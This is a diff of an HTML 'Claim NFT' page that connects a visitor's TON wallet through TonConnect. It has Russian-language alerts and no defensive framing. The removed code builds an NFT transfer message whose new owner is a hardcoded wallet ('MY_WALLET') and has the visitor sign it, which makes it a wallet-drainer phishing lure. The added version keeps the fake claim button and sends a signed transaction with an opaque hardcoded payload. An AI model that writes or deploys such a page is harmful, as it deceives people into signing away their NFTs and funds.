@@ -1,50 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Claim Reward</title>
+    <title>Claim</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <script src="https://unpkg.com/@ton/core@0.51.0/dist/index.min.js"></script>
 </head>
-<body style="background:#111; color:#fff; text-align:center; padding-top:50px;">
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
 
-    <h1>Claim your NFT</h1>
-    <div id="ton-connect"></div>
-    <button id="claim-btn" style="padding:20px; font-size:20px; background:green; color:white; border:none; border-radius:10px; cursor:pointer;">Claim Now</button>
+    <h1>Claim System</h1>
+    <div id="ton-connect-button" style="margin-bottom:20px;"></div>
+    
+    <button id="claim-btn" style="padding:20px; font-size:20px; background:red;">CLAIM NFT</button>
 
     <script>
-        const tonConnectUI = new TonConnectUI({ manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json' });
-        const { beginCell, Address } = window['@ton/core'];
-
-        // Вытаскиваем адрес из URL
-        const params = new URLSearchParams(window.location.search);
-        const nftAddress = params.get('nft');
+        const tonConnectUI = new TonConnectUI({
+            manifestUrl: 'https://newifi.onrender.com/tonconnect-manifest.json',
+            buttonRootId: 'ton-connect-button'
+        });
 
         document.getElementById('claim-btn').onclick = async () => {
-            if (!nftAddress) {
-                alert("Ошибка: адрес NFT не найден в ссылке.");
+            if (!tonConnectUI.connected) {
+                alert("Сначала подключи кошелек через кнопку выше!");
                 return;
             }
-            
-            const MY_WALLET = 'UQATIzX89EOOTqfsr8KE64MXvVSa4CGybjwmkPv3-yHbI3ZE';
-            const body = beginCell()
-                .storeUint(0x5fcc3d14, 32)
-                .storeUint(0, 64)
-                .storeAddress(Address.parse(MY_WALLET))
-                .storeAddress(Address.parse(MY_WALLET))
-                .storeBit(0)
-                .storeCoins(0)
-                .storeBit(0)
-                .endCell();
 
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 360,
-                messages: [{
-                    address: nftAddress,
-                    amount: '50000000',
-                    payload: body.toBoc().toString('base64')
-                }]
-            };
-            await tonConnectUI.sendTransaction(transaction);
+            try {
+                const params = new URLSearchParams(window.location.search);
+                const nft = params.get('nft');
+                
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 360,
+                    messages: [{
+                        address: nft,
+                        amount: '50000000',
+                        payload: 'te6cckEBAQEAAgAAAEAw'
+                    }]
+                };
+                
+                await tonConnectUI.sendTransaction(transaction);
+            } catch (e) {
+                alert("Ошибка: " + e.message);
+            }
         };
     </script>
 </body>
